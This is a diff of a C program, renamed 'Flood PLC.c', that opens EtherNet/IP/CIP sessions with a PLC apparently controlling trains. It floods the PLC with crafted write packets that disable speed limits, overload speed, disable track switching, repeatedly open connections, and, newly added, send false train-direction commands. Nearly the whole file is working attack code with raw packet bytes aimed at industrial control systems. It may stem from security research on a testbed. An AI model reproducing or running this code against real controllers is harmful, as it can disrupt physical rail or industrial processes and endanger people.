@@ -1,5 +1,7 @@
-/* connect.c
-it is used to connect PLC
+/* Flood PLC.c
+	It is used to send a flood of messages to PLC
+	Write by Xuelei Wang
+	29/05/2018
 */
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #define _CRT_NONSTDC_NO_WARNINGS
@@ -18,21 +20,21 @@ byte SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4;	/*session h
 byte ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4;		/*connection ID*/
 byte CIPCount1 = 0xfa, CIPCount2 = 0x00;
 char  recvBuffer[100], input = 0;
-int sendStatus, recvStatus, i;
+int sendStatus, recvStatus;
 
 void DisableSpeed(void);
 void KeepRequest(void);
 void KeepConnect(void);
 void OverLoadSpeed(void);
 void DisableTrackSwitch(void);
+void FalseDirectionCommand(void);
 
 WSADATA       wsa_data;           /* defined in winsock2.h */
-struct sockaddr_in HMI;     /* defined in winsock2.h */
+struct sockaddr_in PLC;     /* defined in winsock2.h */
 struct hostent     *host = NULL;  /* defined in winsock2.h */
 
 int main(void)
 {
-
 	for (;;)
 	{
 		if (kbhit())				// if any input from the keyboard
@@ -55,21 +57,16 @@ int main(void)
 				//KeepConnect		(press c or C)
 			case 67: KeepConnect(); break;
 			case 99: KeepConnect(); break;
+				//FalseDirectionCommand (press f or F)
+			case 70: FalseDirectionCommand(); break;
+			case 102: FalseDirectionCommand(); break;
 
 			default: break;
 			}
 		}
-
-		//Sending normal packet1
-		//Sending normal packet2
-		//Sending normal packet3
-
 	}
-
 	return 0;
 }
-
-
 
 
 
@@ -90,35 +87,36 @@ void DisableSpeed(void)
 		exit(1);
 	}
 
-	HMI.sin_family = AF_INET;
-	HMI.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in tcpserverclient.h */
-	HMI.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in tcpserverclient.h */
+	PLC.sin_family = AF_INET;
+	PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
+	PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */
 
-														   /* Step 3.2: Connect to the TCP Server */
-	if (connect(HMI007, (struct sockaddr *)&HMI, sizeof(HMI)) == SOCKET_ERROR)
+	/* Connect to PLC */
+	if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
 	{
 		printf("connect() failed: %d\n", WSAGetLastError());
 		exit(1);
 	}
 
 	listen(HMI007, 8);
-
+	//Ask for session handle
 	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
 	sendStatus = send(HMI007, Rgsession, 28, 0);
-
+	// Receive session handle number
 	recvStatus = recv(HMI007, recvBuffer, 128, 0);
-
+	// Store session handle number
 	SessionHandle1 = recvBuffer[4];
 	SessionHandle2 = recvBuffer[5];
 	SessionHandle3 = recvBuffer[6];
 	SessionHandle4 = recvBuffer[7];
 	recvBuffer[recvStatus] = 0x00; /* '\0' */
 
-								   //Ask for connection ID
+	//Ask for connection ID
 	byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
 	sendStatus = send(HMI007, connetionmanager, 88, 0);
-	// Receive session number
+	// Receive connection ID
 	recvStatus = recv(HMI007, recvBuffer, 128, 0);
+	//Store connection ID
 	ConnectionID1 = recvBuffer[44];
 	ConnectionID2 = recvBuffer[45];
 	ConnectionID3 = recvBuffer[46];
@@ -127,6 +125,13 @@ void DisableSpeed(void)
 
 	for (;;)
 	{
+		// Press Esc to escape the loop
+		if (kbhit())				// if any input from the keyboard
+		{
+			input = getch();
+			if (input == 27)		// if is Esc
+				break;
+		}
 		//outside stop
 		byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
 			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
@@ -172,6 +177,14 @@ void KeepRequest(void)
 	printf("======== Begin to keep sending requests ========\n\n");
 	for (;;)
 	{
+		// Press Esc to escape the loop
+		if (kbhit())				// if any input from the keyboard
+		{
+			input = getch();
+			if (input == 27)		// if is Esc
+				break;
+		}
+
 		if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
 		{
 			puts("WSAStartup failed!");
@@ -186,40 +199,42 @@ void KeepRequest(void)
 			exit(1);
 		}
 
-		HMI.sin_family = AF_INET;
-		HMI.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in tcpserverclient.h */
-		HMI.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in tcpserverclient.h */
+		PLC.sin_family = AF_INET;
+		PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
+		PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */
 
-															   /* Step 3.2: Connect to the TCP Server */
-		if (connect(HMI007, (struct sockaddr *)&HMI, sizeof(HMI)) == SOCKET_ERROR)
+		/* Connect to PLC */
+		if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
 		{
 			printf("connect() failed: %d\n", WSAGetLastError());
 			exit(1);
 		}
 
 		listen(HMI007, 8);
-
+		//Ask for session handle
 		byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
 		sendStatus = send(HMI007, Rgsession, 28, 0);
-
+		// Receive session handle number
 		recvStatus = recv(HMI007, recvBuffer, 128, 0);
-
+		// Store session handle number
 		SessionHandle1 = recvBuffer[4];
 		SessionHandle2 = recvBuffer[5];
 		SessionHandle3 = recvBuffer[6];
 		SessionHandle4 = recvBuffer[7];
 		recvBuffer[recvStatus] = 0x00; /* '\0' */
 
-									   //Ask for connection ID
+		//Ask for connection ID
 		byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
 		sendStatus = send(HMI007, connetionmanager, 88, 0);
-		// Receive session number
+		// Receive connection ID
 		recvStatus = recv(HMI007, recvBuffer, 128, 0);
+		//Store connection ID
 		ConnectionID1 = recvBuffer[44];
 		ConnectionID2 = recvBuffer[45];
 		ConnectionID3 = recvBuffer[46];
 		ConnectionID4 = recvBuffer[47];
 		recvBuffer[recvStatus] = 0x00; /* '\0' */
+
 		closesocket(HMI007);
 	}
 }
@@ -229,6 +244,14 @@ void KeepConnect(void)
 	printf("======== Begin to keep connecting and closing ========\n\n");
 	for (;;)
 	{
+		// Press Esc to escape the loop
+		if (kbhit())				// if any input from the keyboard
+		{
+			input = getch();
+			if (input == 27)		// if is Esc
+				break;
+		}
+
 		if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
 		{
 			puts("WSAStartup failed!");
@@ -243,12 +266,12 @@ void KeepConnect(void)
 			exit(1);
 		}
 
-		HMI.sin_family = AF_INET;
-		HMI.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in tcpserverclient.h */
-		HMI.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in tcpserverclient.h */
+		PLC.sin_family = AF_INET;
+		PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
+		PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */
 
-															   /* Step 3.2: Connect to the TCP Server */
-		if (connect(HMI007, (struct sockaddr *)&HMI, sizeof(HMI)) == SOCKET_ERROR)
+		/* Connect to PLC */
+		if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
 		{
 			printf("connect() failed: %d\n", WSAGetLastError());
 			exit(1);
@@ -274,35 +297,36 @@ void OverLoadSpeed(void)
 		exit(1);
 	}
 
-	HMI.sin_family = AF_INET;
-	HMI.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in tcpserverclient.h */
-	HMI.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in tcpserverclient.h */
+	PLC.sin_family = AF_INET;
+	PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
+	PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */
 
-														   /* Step 3.2: Connect to the TCP Server */
-	if (connect(HMI007, (struct sockaddr *)&HMI, sizeof(HMI)) == SOCKET_ERROR)
+	/* Connect to PLC */
+	if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
 	{
 		printf("connect() failed: %d\n", WSAGetLastError());
 		exit(1);
 	}
 
 	listen(HMI007, 8);
-
+	//Ask for session handle
 	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
 	sendStatus = send(HMI007, Rgsession, 28, 0);
-
+	// Receive session handle number
 	recvStatus = recv(HMI007, recvBuffer, 128, 0);
-
+	// Store session handle number
 	SessionHandle1 = recvBuffer[4];
 	SessionHandle2 = recvBuffer[5];
 	SessionHandle3 = recvBuffer[6];
 	SessionHandle4 = recvBuffer[7];
 	recvBuffer[recvStatus] = 0x00; /* '\0' */
 
-								   //Ask for connection ID
+	//Ask for connection ID
 	byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
 	sendStatus = send(HMI007, connetionmanager, 88, 0);
-	// Receive session number
+	// Receive connection ID
 	recvStatus = recv(HMI007, recvBuffer, 128, 0);
+	//Store connection ID
 	ConnectionID1 = recvBuffer[44];
 	ConnectionID2 = recvBuffer[45];
 	ConnectionID3 = recvBuffer[46];
@@ -311,6 +335,14 @@ void OverLoadSpeed(void)
 
 	for (;;)
 	{
+		// Press Esc to escape the loop
+		if (kbhit())				// if any input from the keyboard
+		{
+			input = getch();
+			if (input == 27)		// if is Esc
+				break;
+		}
+
 		byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
 			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
 			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
@@ -348,42 +380,52 @@ void DisableTrackSwitch(void)
 		exit(1);
 	}
 
-	HMI.sin_family = AF_INET;
-	HMI.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in tcpserverclient.h */
-	HMI.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in tcpserverclient.h */
+	PLC.sin_family = AF_INET;
+	PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
+	PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */
 
-														   /* Step 3.2: Connect to the TCP Server */
-	if (connect(HMI007, (struct sockaddr *)&HMI, sizeof(HMI)) == SOCKET_ERROR)
+	/* Connect to PLC */
+	if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
 	{
 		printf("connect() failed: %d\n", WSAGetLastError());
 		exit(1);
 	}
 
 	listen(HMI007, 8);
-
+	//Ask for session handle
 	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
 	sendStatus = send(HMI007, Rgsession, 28, 0);
-
+	// Receive session handle number
 	recvStatus = recv(HMI007, recvBuffer, 128, 0);
-
+	// Store session handle number
 	SessionHandle1 = recvBuffer[4];
 	SessionHandle2 = recvBuffer[5];
 	SessionHandle3 = recvBuffer[6];
 	SessionHandle4 = recvBuffer[7];
 	recvBuffer[recvStatus] = 0x00; /* '\0' */
 
-								   //Ask for connection ID
+	//Ask for connection ID
 	byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
 	sendStatus = send(HMI007, connetionmanager, 88, 0);
-	// Receive session number
+	// Receive connection ID
 	recvStatus = recv(HMI007, recvBuffer, 128, 0);
+	//Store connection ID
 	ConnectionID1 = recvBuffer[44];
 	ConnectionID2 = recvBuffer[45];
 	ConnectionID3 = recvBuffer[46];
 	ConnectionID4 = recvBuffer[47];
 	recvBuffer[recvStatus] = 0x00; /* '\0' */
+
 	for (;;)
 	{
+		// Press Esc to escape the loop
+		if (kbhit())				// if any input from the keyboard
+		{
+			input = getch();
+			if (input == 27)		// if is Esc
+				break;
+		}
+
 		byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
 			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
 			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
@@ -413,5 +455,110 @@ void DisableTrackSwitch(void)
 	}
 }
 
+void FalseDirectionCommand(void)
+{
+	printf("======== Begin to send false command of direction ========\n\n");
+	if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
+	{
+		puts("WSAStartup failed!");
+		exit(1);
+	}
 
+
+	HMI007 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (HMI007 == INVALID_SOCKET)
+	{
+		printf("Failed to create socket(): %d\n", WSAGetLastError());
+		exit(1);
+	}
+
+	PLC.sin_family = AF_INET;
+	PLC.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in reference.h */
+	PLC.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in reference.h */
+
+	/* Connect to PLC */
+	if (connect(HMI007, (struct sockaddr *)&PLC, sizeof(PLC)) == SOCKET_ERROR)
+	{
+		printf("connect() failed: %d\n", WSAGetLastError());
+		exit(1);
+	}
+
+	listen(HMI007, 8);
+	//Ask for session handle
+	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
+	sendStatus = send(HMI007, Rgsession, 28, 0);
+	// Receive session handle number
+	recvStatus = recv(HMI007, recvBuffer, 128, 0);
+	// Store session handle number
+	SessionHandle1 = recvBuffer[4];
+	SessionHandle2 = recvBuffer[5];
+	SessionHandle3 = recvBuffer[6];
+	SessionHandle4 = recvBuffer[7];
+	recvBuffer[recvStatus] = 0x00; /* '\0' */
+
+	//Ask for connection ID
+	byte connetionmanager[] = { 0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
+	sendStatus = send(HMI007, connetionmanager, 88, 0);
+	// Receive connection ID
+	recvStatus = recv(HMI007, recvBuffer, 128, 0);
+	//Store connection ID
+	ConnectionID1 = recvBuffer[44];
+	ConnectionID2 = recvBuffer[45];
+	ConnectionID3 = recvBuffer[46];
+	ConnectionID4 = recvBuffer[47];
+	recvBuffer[recvStatus] = 0x00; /* '\0' */
+
+	for (;;)
+	{
+		// Press Esc to escape the loop
+		if (kbhit())				// if any input from the keyboard
+		{
+			input = getch();
+			if (input == 27)		// if is Esc
+				break;
+		}
+
+		//inside
+		byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
+			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
+			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
+			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
+			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x32, 0x5f, 0x4f, 0x6e, 0x5f, 0x32, /*Train_2_on_2*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };
+
+		sendStatus = send(HMI007, sendMessageStr1, 67, 0);
+		CIPCount1++;
+		Sleep(10);
+
+		byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
+			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
+			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
+			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
+			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x32, 0x5f, 0x4f, 0x6e, 0x5f, 0x33, /*Train_2_on_3*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };
+
+		sendStatus = send(HMI007, sendMessageStr2, 67, 0);
+		CIPCount1++;
+		Sleep(10);
+
+		//outside
+		byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
+			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
+			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
+			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
+			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x31, 0x5f, 0x4f, 0x6e, 0x5f, 0x32, /*Train_1_on_2*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };
+
+		sendStatus = send(HMI007, sendMessageStr3, 67, 0);
+		CIPCount1++;
+		Sleep(10);
+
+		byte sendMessageStr4[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
+			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
+			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
+			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
+			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x31, 0x5f, 0x4f, 0x6e, 0x5f, 0x33, /*Train_1_on_3*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };
+
+		sendStatus = send(HMI007, sendMessageStr4, 67, 0);
+		CIPCount1++;
+
+	}
+}
 
